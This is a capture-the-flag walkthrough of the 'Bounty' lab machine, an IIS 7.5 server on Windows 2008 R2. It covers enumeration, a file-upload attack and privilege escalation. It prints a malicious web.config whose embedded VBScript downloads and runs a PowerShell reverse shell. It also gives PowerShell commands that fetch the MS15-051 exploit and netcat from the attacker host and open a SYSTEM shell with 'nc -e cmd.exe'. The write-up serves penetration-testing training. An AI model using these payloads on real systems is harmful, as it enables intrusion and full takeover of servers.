# Bounty

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.240     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 08:57 EDT
Nmap scan report for 10.129.85.240
Host is up (0.012s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

This is a pretty old machine AND its running Windows, so there's probably some kind of IIS exploit here.

### File Upload

The web application just shows an image of a wizard:

<figure><img src="../../../.gitbook/assets/image (1573).png" alt=""><figcaption></figcaption></figure>

A quick check on the requests reveals this is running Microsoft-IIS/7.5.

<figure><img src="../../../.gitbook/assets/image (1054).png" alt=""><figcaption></figcaption></figure>

We can run a quick `gobuster` scan with `aspx,html,txt` extensions, and find a few files.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.85.240/ -t 100 -x aspx,html,txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.85.240/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,txt,aspx
[+] Timeout:                 10s
===============================================================
2023/05/06 09:00:00 Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
/uploadedfiles        (Status: 301) [Size: 0]
```

The ASPX page was a simple file upload.&#x20;

<figure><img src="../../../.gitbook/assets/image (1326).png" alt=""><figcaption></figcaption></figure>

I tried to upload an ASPX reverse shell, but it gives me an Invalid File error.

<figure><img src="../../../.gitbook/assets/image (2833).png" alt=""><figcaption></figcaption></figure>

This can be bypassed via NULL byte by appending `%00.jpg` to the end of the filename in Burp.

<figure><img src="../../../.gitbook/assets/image (3532).png" alt=""><figcaption></figcaption></figure>

However, when trying to view the file at `/UploadedFiles/rev.aspx`, it returns an error instead of a shell.

<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

So uploading ASPX files doesn't work. But how about `web.config` files? It is possible to upload one that has VBScript embedded within it to execute commands. This is because we can potentially overwrite the existing `web.config` file and replace it with ours that executes commands.

Here's the file I used:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.13/Invoke-PowerShellTcp.ps1')")
%>
```

This would download a simple Powershell reverse shell from our device. We can directly upload the `web.config` file without bypassing any file extension checks. Afterwards, visiting the `/UploadedFiles/web.config` directory would make the machine download and run the script, giving us a reverse shell.

<figure><img src="../../../.gitbook/assets/image (1758).png" alt=""><figcaption></figcaption></figure>

We can grab the user flag.

## Privilege Escalation

### MS15-051

I did a quick check on the machine's OS by running `systeminfo`.

```
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          5/6/2023, 9:04:11 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,575 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,587 MB
Virtual Memory: In Use:    508 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.85.240
                                 [02]: fe80::4112:6417:a55f:fe64
                                 [03]: dead:beef::4112:6417:a55f:fe64
```

This was running Windows Datacenter 2008 and had no hotfixes applied. This means it is vulnerable to MS15-051.&#x20;

{% embed url="https://github.com/hfiref0x/CVE-2015-1701/tree/master/Compiled" %}

We can download the exploit and `nc.exe` to the machine via Powershell and run `exploit.exe` like this:

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.13/ms15-051x64.exe', 'C:\users\merlin\desktop\exploit.exe')
(New-Object Net.WebClient).DownloadFile('http://10.10.14.13/nc64.exe','C:\users\merlin\desktop\nc.exe')
C:\users\merlin\desktop\exploit.exe "C:\users\merlin\desktop\nc.exe -e cmd.exe 10.10.14.13 4444"
```

This would give us a reverse shell as SYSTEM.

<figure><img src="../../../.gitbook/assets/image (1212).png" alt=""><figcaption></figcaption></figure>

Rooted!
